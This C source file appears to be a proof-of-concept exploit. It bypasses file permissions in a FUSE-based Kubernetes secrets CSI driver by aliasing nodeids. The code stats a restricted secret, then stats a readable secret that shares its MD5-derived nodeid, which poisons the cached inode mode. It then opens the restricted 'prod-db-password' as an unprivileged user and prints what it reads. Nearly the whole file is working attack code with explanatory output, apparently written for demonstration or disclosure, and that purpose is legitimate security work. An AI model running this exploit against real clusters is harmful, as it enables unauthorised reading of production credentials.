/* attacker_pod.c — Unprivileged pod process exploiting FUSE nodeid aliasing
 *
 * Scenario:
 *   A Kubernetes node runs a FUSE-based secrets store CSI driver.
 *   The driver uses MD5(secret_value) as the FUSE nodeid.
 *   Two secrets happen to contain the same value:
 *
 *     dev-shared-key   — mode=0644  (dev team can read, nodeid=0x651b3722d014767b)
 *     prod-db-password — mode=0000  (app service-account only, same nodeid!)
 *
 *   The attacker is a pod process (uid != 0) that has legitimate access to
 *   dev-shared-key but SHOULD NOT be able to read prod-db-password.
 *
 * Attack (3 syscalls):
 *   1. stat(prod-db-password) → kernel creates inode 0x651b... with mode=0000
 *   2. stat(dev-shared-key)   → kernel UPDATES inode 0x651b... to mode=0644
 *   3. open(prod-db-password) → kernel checks inode mode=0644 → ALLOWED
 *
 * Compile: gcc -O2 -o attacker_pod attacker_pod.c
 * Run:     ./attacker_pod   (as non-root uid, no sudo)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>

#define MNTDIR       "/tmp/k8s_secrets_mount"
#define PROD_SECRET  MNTDIR "/prod-db-password"
#define DEV_SECRET   MNTDIR "/dev-shared-key"

static void show_kernel_inode(const char *label, const char *path)
{
    struct stat st;
    if (stat(path, &st) == 0) {
        printf("    kernel inode: mode=0%04o  nodeid=0x%lx  ← %s\n",
               st.st_mode & 0xFFF,
               (unsigned long)st.st_ino,
               label);
    } else {
        printf("    stat failed:  %s  (%s)\n", strerror(errno), label);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║        POD ATTACKER — uid=%-4d  (no sudo, no capabilities)  ║\n",
           (int)getuid());
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  Mount:        %-47s║\n", MNTDIR);
    printf("║  Target:       prod-db-password  (mode=0000, app-sa only)  ║\n");
    printf("║  Has access to: dev-shared-key   (mode=0644, dev readable) ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    if (getuid() == 0) {
        fprintf(stderr,
            "WARNING: running as root — run as a non-root user to demonstrate\n"
            "the permission bypass. The attack only makes sense for uid != 0.\n\n");
    }

    /* ------------------------------------------------------------------ *
     * Pre-check: confirm prod-db-password is inaccessible before attack
     * ------------------------------------------------------------------ */
    printf("[ PRE-CHECK ] Verifying prod-db-password is locked down...\n");
    {
        int fd = open(PROD_SECRET, O_RDONLY);
        if (fd < 0) {
            printf("    open(prod-db-password) = DENIED (%s)  ✓ correct\n\n",
                   strerror(errno));
        } else {
            printf("    open(prod-db-password) = already OPEN (no exploit needed?)\n\n");
            close(fd);
        }
    }

    /* ------------------------------------------------------------------ *
     * Step 1 — stat(prod-db-password)
     *
     * The kernel has never seen this path. It sends FUSE_LOOKUP to the
     * CSI daemon. The daemon replies: nodeid=0x651b3722d014767b, mode=0000.
     * The kernel creates inode 0x651b... in the cache with mode=0000.
     * Dentry is cached for ENTRY_TTL (1 hour) — no re-validation.
     * ------------------------------------------------------------------ */
    printf("[ STEP 1 ] stat(prod-db-password)\n");
    printf("    Kernel asks CSI daemon: what is prod-db-password?\n");
    printf("    Daemon replies: nodeid=0x651b3722d014767b, mode=0000\n");
    printf("    Kernel creates inode 0x651b... with mode=0000 in VFS cache\n");

    show_kernel_inode("just created from daemon LOOKUP response", PROD_SECRET);

    printf("    Dentry 'prod-db-password' cached for 1 hour.\n\n");

    /* ------------------------------------------------------------------ *
     * Step 2 — stat(dev-shared-key)  ← the poison
     *
     * The kernel sends FUSE_LOOKUP for dev-shared-key.
     * The daemon replies: same nodeid=0x651b3722d014767b, mode=0644.
     * The kernel finds existing inode 0x651b... and calls
     * fuse_change_attributes() which UPDATES the mode from 0000 → 0644.
     *
     * The dentry for prod-db-password is still cached (1 hour hasn't
     * passed), so the kernel will NOT re-validate it.
     * ------------------------------------------------------------------ */
    printf("[ STEP 2 ] stat(dev-shared-key)  ← inode poison\n");
    printf("    Kernel asks CSI daemon: what is dev-shared-key?\n");
    printf("    Daemon replies: nodeid=0x651b3722d014767b, mode=0644\n");
    printf("    Kernel finds EXISTING inode 0x651b... → fuse_change_attributes()\n");
    printf("    inode mode updated: 0000 → 0644\n");
    printf("    Both paths now share inode 0x651b... = mode=0644\n");

    show_kernel_inode("inode AFTER poison  (shared by both secrets)", DEV_SECRET);

    printf("\n");

    /* ------------------------------------------------------------------ *
     * Step 3 — stat(prod-db-password) again — verify kernel was poisoned
     *
     * The dentry is still cached. The kernel does NOT call FUSE_LOOKUP.
     * It reads inode 0x651b... directly from cache → mode=0644.
     * Watch the daemon terminal — it prints NOTHING for this stat.
     * ------------------------------------------------------------------ */
    printf("[ STEP 3 ] stat(prod-db-password) — check the kernel is fooled\n");
    printf("    Dentry is cached → kernel does NOT contact the CSI daemon.\n");
    printf("    Watch the daemon terminal — it should print NOTHING.\n");

    show_kernel_inode("prod-db-password via cached dentry (SHOULD be 0000)", PROD_SECRET);

    printf("\n");

    /* ------------------------------------------------------------------ *
     * Step 4 — open(prod-db-password) as unprivileged uid
     *
     * Permission check:
     *   inode->i_mode = 0644  (poisoned)
     *   our uid != 0          (pod process)
     *   0644: other = r → READ allowed
     *
     * The CSI daemon's intended mode=0000 is never consulted.
     * The kernel never sends FUSE_ACCESS (default_permissions suppresses it).
     * ------------------------------------------------------------------ */
    printf("[ STEP 4 ] open(prod-db-password, O_RDONLY) as uid=%d\n", (int)getuid());
    printf("    Kernel checks: inode 0x651b... mode=0644, uid=%d is 'other' → READ allowed\n",
           (int)getuid());
    printf("    The CSI daemon's mode=0000 is never consulted.\n");
    printf("    No FUSE_ACCESS sent (default_permissions delegates to inode bits).\n\n");

    errno = 0;
    int fd = open(PROD_SECRET, O_RDONLY);

    if (fd < 0) {
        printf("    open = DENIED (%s)\n\n", strerror(errno));
        printf("    Attack did not work on this kernel/config.\n");
        printf("    Possible reasons:\n");
        printf("      - Kernel patched the fuse_change_attributes() aliasing path\n");
        printf("      - Mount options differ (missing allow_other or default_permissions)\n");
        printf("      - CSI daemon not running or mount not at %s\n", MNTDIR);
        return 1;
    }

    char buf[128] = {0};
    ssize_t nr = read(fd, buf, sizeof buf - 1);
    close(fd);

    printf("    ┌──────────────────────────────────────────────────────────┐\n");
    printf("    │  open(prod-db-password)  =  OPENED   ← BYPASS!          │\n");
    printf("    │  read %2zd bytes: %s│\n", nr, buf);
    printf("    └──────────────────────────────────────────────────────────┘\n\n");

    /* ------------------------------------------------------------------ *
     * Summary
     * ------------------------------------------------------------------ */
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                         SUMMARY                             ║\n");
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  prod-db-password  CSI-intended mode  : 0000 (no access)   ║\n");
    printf("║  prod-db-password  kernel-cached mode : 0644 (poisoned)    ║\n");
    printf("║  attacker uid                         : %-4d               ║\n",
           (int)getuid());
    printf("║  sudo / capabilities used             : NO                 ║\n");
    printf("║  exploit code                         : NONE               ║\n");
    printf("║  syscalls used                        : stat, stat, open   ║\n");
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  Root cause: CSI driver uses MD5(value) as FUSE nodeid.    ║\n");
    printf("║  Two secrets with identical values → same nodeid → shared  ║\n");
    printf("║  VFS inode. fuse_change_attributes() overwrites mode from  ║\n");
    printf("║  whichever LOOKUP came last, without path-aware validation. ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");

    return 0;
}
